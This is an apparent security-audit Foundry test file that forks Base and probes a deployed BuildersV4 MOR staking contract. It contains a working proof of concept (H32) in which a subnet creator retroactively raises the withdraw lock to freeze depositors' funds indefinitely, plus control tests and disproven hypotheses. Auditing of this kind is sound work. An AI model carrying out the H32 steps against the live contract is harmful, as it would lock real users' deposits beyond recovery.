// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20M {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

struct Subnet {
    string name;
    address admin;
    uint128 unused1;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unused2;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadata {
    string slug;
    string description;
    string website;
    string image;
}

struct UserData {
    uint128 lastDeposit;
    uint128 unused1;
    uint256 deposited;
    uint256 unused2;
}

struct SubnetData {
    uint128 unused1;
    uint256 deposited;
    uint256 unused2;
    uint256 rate;
    uint256 pendingRewards;
}

interface IBuildersV4D2 {
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    // NOTE: the deployed `subnets` getter returns the struct as a tuple.
    // Declaring it as `returns (Subnet memory)` makes the call revert on
    // ABI-decoding in this Foundry version (dynamic `string` first field);
    // the tuple form decodes fine (verified empirically on the fork).
    function subnets(bytes32 subnetId_)
        external
        view
        returns (string memory, address, uint128, uint128, uint128, uint256, address);
    function usersData(address user_, bytes32 subnetId_) external view returns (UserData memory);
    function subnetsData(bytes32 subnetId_) external view returns (SubnetData memory);
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
    function getCurrentSubnetsRewards() external view returns (uint256);
    function setNetworkShare(uint256 networkShare_) external;
    function setMinimalWithdrawLockPeriod(uint256 v_) external;
    function version() external pure returns (uint256);
}

interface IBuildersTreasuryV2D2 {
    function withdraw(address receiver_, uint256 amount_) external;
    function sendRewards(address receiver_, uint256 amount_) external;
}

interface IFeeConfigD2 {
    function setFee(address sender_, uint256 fee_) external;
    function getFeeAndTreasuryForOperation(address sender_, bytes32 operation_)
        external
        view
        returns (uint256, address);
}

interface IRewardPoolD2 {
    function getPeriodRewards(uint256 index_, uint128 startTime_, uint128 endTime_)
        external
        view
        returns (uint256);
}

/// @title Fase 2 Lane D2 — BuildersV4 (Base) hunt
/// @notice Fork PoC gate: every hypothesis is tested against deployed
///         BuildersV4 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9 on a Base
///         fork pinned at block 56038769. Attacker = fresh unprivileged
///         address; no owner/admin/multisig prank anywhere.
///         MOR price at read time ~$0.79 (Lane C).
contract PocD2BuildersTest is Test {
    uint256 constant BASE_BLOCK = 56038769;
    address constant BUILDERS_V4 = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant TREASURY = 0x9eba628581896ce086cb8f1A513ea6097A8FC561;
    address constant FEE_CONFIG = 0x845FBB4B3e2207BF03087b8B94D2430AB11088eE;
    address constant REWARD_POOL = 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    uint256 constant DAY = 86400;
    uint256 constant MIN_LOCK = 604800; // 7 days, live minimalWithdrawLockPeriod

    address attacker;
    address victim1;
    address victim2;
    address victim3;

    function setUp() public {
        vm.createSelectFork("base", BASE_BLOCK);
        attacker = makeAddr("attacker");
        victim1 = makeAddr("victim1");
        victim2 = makeAddr("victim2");
        victim3 = makeAddr("victim3");
        vm.deal(attacker, 10 ether);
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);
        vm.deal(victim3, 10 ether);
        // Fund actors with MOR (deal sets the ERC20 balance slot on the fork).
        deal(MOR, attacker, 100_000 ether);
        deal(MOR, victim1, 100_000 ether);
        deal(MOR, victim2, 100_000 ether);
        deal(MOR, victim3, 100_000 ether);
    }

    function _mkSubnet(string memory name, address admin, uint256 lock) internal pure returns (Subnet memory) {
        return
            Subnet({
                name: name,
                admin: admin,
                unused1: 0,
                withdrawLockPeriodAfterDeposit: uint128(lock),
                unused2: 0,
                minimalDeposit: 1 ether,
                claimAdmin: admin
            });
    }

    function _mkMeta() internal pure returns (SubnetMetadata memory) {
        return SubnetMetadata({slug: "d2", description: "d2", website: "https://example.com", image: ""});
    }

    function _createAttackerSubnet(string memory name, uint256 lock) internal returns (bytes32 id) {
        id = IBuildersV4D2(BUILDERS_V4).getSubnetId(name);
        vm.prank(attacker);
        IBuildersV4D2(BUILDERS_V4).createSubnet(_mkSubnet(name, attacker, lock), _mkMeta());
    }

    function _subnetLock(bytes32 id) internal view returns (uint128 lock) {
        (,,, lock,,,) = IBuildersV4D2(BUILDERS_V4).subnets(id);
    }

    function _deposit(address who, bytes32 id, uint256 amount) internal {
        vm.prank(who);
        IERC20M(MOR).approve(BUILDERS_V4, amount);
        vm.prank(who);
        IBuildersV4D2(BUILDERS_V4).deposit(id, amount);
    }

    // ------------------------------------------------------------------
    // H32 — subnet admin retroactively raises the withdraw lock, freezing
    // all depositors' MOR indefinitely. PROVEN (see report for scope caveats).
    // ------------------------------------------------------------------
    function test_D2_H32_AdminRetroactiveLockFreeze() public {
        bytes32 id = _createAttackerSubnet("D2FreezeSubnet", MIN_LOCK);

        // Victims stake 10,000 MOR each under the advertised 7-day lock.
        _deposit(victim1, id, 10_000 ether);
        _deposit(victim2, id, 10_000 ether);
        _deposit(victim3, id, 10_000 ether);
        assertEq(IERC20M(MOR).balanceOf(BUILDERS_V4), 2_946_066.734834084407995896 ether + 30_000 ether);

        // 1 day later the admin edits the subnet: lock -> ~2^127 seconds
        // (~5e30 years; type(uint128).max/2 avoids a uint128 overflow panic
        // in the withdraw check, so the revert is the clean require).
        vm.warp(block.timestamp + 1 days);
        Subnet memory edited = _mkSubnet("D2FreezeSubnet", attacker, uint256(type(uint128).max) / 2);
        vm.prank(attacker);
        IBuildersV4D2(BUILDERS_V4).editSubnet(id, edited);
        assertEq(uint256(_subnetLock(id)), uint256(type(uint128).max) / 2);

        // Past the ORIGINAL 7-day lock: victims still cannot withdraw.
        vm.warp(block.timestamp + 8 days);
        vm.prank(victim1);
        vm.expectRevert("BU: user withdraw is locked");
        IBuildersV4D2(BUILDERS_V4).withdraw(id, 10_000 ether);
        vm.prank(victim2);
        vm.expectRevert("BU: user withdraw is locked");
        IBuildersV4D2(BUILDERS_V4).withdraw(id, 1 ether);

        // Even 10 years later the funds are still frozen.
        vm.warp(block.timestamp + 3650 days);
        vm.prank(victim3);
        vm.expectRevert("BU: user withdraw is locked");
        IBuildersV4D2(BUILDERS_V4).withdraw(id, 10_000 ether);

        // LOSS: 30,000 MOR (~$23,700 at $0.79) permanently locked in
        // BuildersV4, owned by victims, with no victim-side exit.
        assertEq(IBuildersV4D2(BUILDERS_V4).usersData(victim1, id).deposited, 10_000 ether);
        assertEq(IBuildersV4D2(BUILDERS_V4).usersData(victim2, id).deposited, 10_000 ether);
        assertEq(IBuildersV4D2(BUILDERS_V4).usersData(victim3, id).deposited, 10_000 ether);
        assertEq(IERC20M(MOR).balanceOf(victim1), 90_000 ether); // only their un-deposited MOR
        assertEq(IERC20M(MOR).balanceOf(BUILDERS_V4), 2_946_066.734834084407995896 ether + 30_000 ether);
    }

    // Control: without the edit, withdraw works after the lock expires, and
    // even a retroactive minimalDeposit hike cannot block a FULL withdraw.
    function test_D2_Control_WithdrawWorksAfterLock() public {
        bytes32 id = _createAttackerSubnet("D2ControlSubnet", MIN_LOCK);
        _deposit(victim1, id, 10_000 ether);

        vm.warp(block.timestamp + 1 days);
        // Admin hikes minimalDeposit above the victim's balance.
        Subnet memory edited = _mkSubnet("D2ControlSubnet", attacker, MIN_LOCK);
        edited.minimalDeposit = 50_000 ether;
        vm.prank(attacker);
        IBuildersV4D2(BUILDERS_V4).editSubnet(id, edited);

        vm.warp(block.timestamp + 8 days);
        vm.prank(victim1);
        IBuildersV4D2(BUILDERS_V4).withdraw(id, 10_000 ether);
        assertEq(IERC20M(MOR).balanceOf(victim1), 100_000 ether);
        assertEq(IBuildersV4D2(BUILDERS_V4).usersData(victim1, id).deposited, 0);
    }

    // Control: immediate withdraw (inside the lock) reverts; this is the
    // normal lock, proving the H32 revert above comes from the edited lock.
    function test_D2_Control_WithdrawLockedImmediately() public {
        bytes32 id = _createAttackerSubnet("D2LockSubnet", MIN_LOCK);
        _deposit(victim1, id, 10_000 ether);
        vm.prank(victim1);
        vm.expectRevert("BU: user withdraw is locked");
        IBuildersV4D2(BUILDERS_V4).withdraw(id, 10_000 ether);
    }

    // ------------------------------------------------------------------
    // H-A — self-scoping of deposit/withdraw/claim. DEAD: every path is
    // keyed on _msgSender() (or admin/claimAdmin for claim).
    // ------------------------------------------------------------------
    function test_D2_SelfScoping_Dead() public {
        // Victim owns the subnet and stakes 5,000 MOR.
        bytes32 id = IBuildersV4D2(BUILDERS_V4).getSubnetId("D2VictimSubnet");
        vm.prank(victim1);
        IBuildersV4D2(BUILDERS_V4).createSubnet(_mkSubnet("D2VictimSubnet", victim1, MIN_LOCK), _mkMeta());
        _deposit(victim1, id, 5_000 ether);

        // Attacker cannot withdraw the victim's position (own balance is 0).
        vm.prank(attacker);
        vm.expectRevert("BU: nothing to withdraw");
        IBuildersV4D2(BUILDERS_V4).withdraw(id, 100 ether);

        // Attacker cannot claim the victim subnet's rewards (not admin).
        vm.prank(attacker);
        vm.expectRevert("BU: invalid caller");
        IBuildersV4D2(BUILDERS_V4).claim(id, attacker);

        // Attacker CAN deposit into the victim's subnet — but only into
        // their OWN position — and can withdraw exactly that back.
        _deposit(attacker, id, 100 ether);
        vm.warp(block.timestamp + 8 days);
        vm.prank(attacker);
        IBuildersV4D2(BUILDERS_V4).withdraw(id, 100 ether);
        assertEq(IERC20M(MOR).balanceOf(attacker), 100_000 ether);
        assertEq(IBuildersV4D2(BUILDERS_V4).usersData(victim1, id).deposited, 5_000 ether);
    }

    // ------------------------------------------------------------------
    // H-B — no back-claiming: a subnet created LATER earns nothing for the
    // accrual period before it existed. DEAD.
    // ------------------------------------------------------------------
    function test_D2_NoBackClaim_Dead() public {
        // 30 days pass with the pre-existing ~2.95M MOR staked (rewards
        // accrue globally to the old subnets the whole time).
        vm.warp(block.timestamp + 30 days);
        uint256 globalBefore = IBuildersV4D2(BUILDERS_V4).getCurrentSubnetsRewards();
        assertGt(globalBefore, 0);

        // Attacker creates a fresh subnet and deposits 1,000 MOR now.
        bytes32 id = _createAttackerSubnet("D2LateSubnet", MIN_LOCK);
        _deposit(attacker, id, 1_000 ether);

        // Immediately after joining: zero pending (no retroactive share).
        assertEq(IBuildersV4D2(BUILDERS_V4).getCurrentSubnetRewards(id), 0);

        // After 1 more day it earns only ~1 day of its own share:
        // ~2,764 MOR/day * (1,000 / 2,947,066) ~= 0.94 MOR — NOT 30 days.
        vm.warp(block.timestamp + 1 days);
        uint256 pending = IBuildersV4D2(BUILDERS_V4).getCurrentSubnetRewards(id);
        assertGt(pending, 0);
        assertLt(pending, 2 ether, "pending must be ~1 day of accrual, not 31 days");

        // Global invariant holds: new subnets' pending <= global claimable.
        assertLe(pending, IBuildersV4D2(BUILDERS_V4).getCurrentSubnetsRewards());
    }

    // ------------------------------------------------------------------
    // H-E — LinearDistributionIntervalDecrease additivity via RewardPool.
    // No double-counting across period splits. DEAD.
    // ------------------------------------------------------------------
    function test_D2_LibraryAdditivity_Dead() public {
        uint128 t0 = 1707393600; // pool 3 payoutStart (live)
        uint128 t1 = t0 + 100 days;
        uint128 t2 = t0 + 200 days;
        uint256 a = IRewardPoolD2(REWARD_POOL).getPeriodRewards(3, t0, t1);
        uint256 b = IRewardPoolD2(REWARD_POOL).getPeriodRewards(3, t1, t2);
        uint256 c = IRewardPoolD2(REWARD_POOL).getPeriodRewards(3, t0, t2);
        assertGt(a, 0);
        assertGt(b, 0);
        assertEq(a + b, c, "split periods must sum to the whole period");

        // Exact interval-boundary split (decreaseInterval = 1 day).
        uint128 tb = t0 + 86400;
        uint256 x = IRewardPoolD2(REWARD_POOL).getPeriodRewards(3, t0, tb);
        uint256 y = IRewardPoolD2(REWARD_POOL).getPeriodRewards(3, tb, tb + 86400);
        uint256 z = IRewardPoolD2(REWARD_POOL).getPeriodRewards(3, t0, tb + 86400);
        assertEq(x + y, z, "boundary split must sum exactly");

        // Degenerate periods pay 0.
        assertEq(IRewardPoolD2(REWARD_POOL).getPeriodRewards(3, t1, t1), 0);
        assertEq(IRewardPoolD2(REWARD_POOL).getPeriodRewards(3, t1, t0), 0);
        assertEq(IRewardPoolD2(REWARD_POOL).getPeriodRewards(99, t0, t2), 0); // no such pool
    }

    // ------------------------------------------------------------------
    // H-F/H-G — privileged paths revert for an unprivileged caller. DEAD.
    // ------------------------------------------------------------------
    function test_D2_PrivilegedPaths_Dead() public {
        vm.prank(attacker);
        vm.expectRevert("BU: invalid caller");
        IBuildersV4D2(BUILDERS_V4).setNetworkShare(1e25);

        vm.prank(attacker);
        vm.expectRevert();
        IBuildersV4D2(BUILDERS_V4).setMinimalWithdrawLockPeriod(1);

        vm.prank(attacker);
        vm.expectRevert();
        IBuildersTreasuryV2D2(TREASURY).withdraw(attacker, 1 ether);

        vm.prank(attacker);
        vm.expectRevert("BT: the caller isn't the `BuildersV4`");
        IBuildersTreasuryV2D2(TREASURY).sendRewards(attacker, 1 ether);

        vm.prank(attacker);
        vm.expectRevert();
        IFeeConfigD2(FEE_CONFIG).setFee(attacker, 1);
    }

    // ------------------------------------------------------------------
    // H-D — live claim fee is 0 (FeeConfig, owner-set anyway). No fee path
    // an unprivileged caller can abuse. DEAD.
    // ------------------------------------------------------------------
    function test_D2_ClaimFeeIsZero_Dead() public {
        (uint256 fee, address treasury) = IFeeConfigD2(FEE_CONFIG).getFeeAndTreasuryForOperation(
            BUILDERS_V4,
            "claim"
        );
        assertEq(fee, 0);
        assertTrue(treasury != address(0));
    }
}
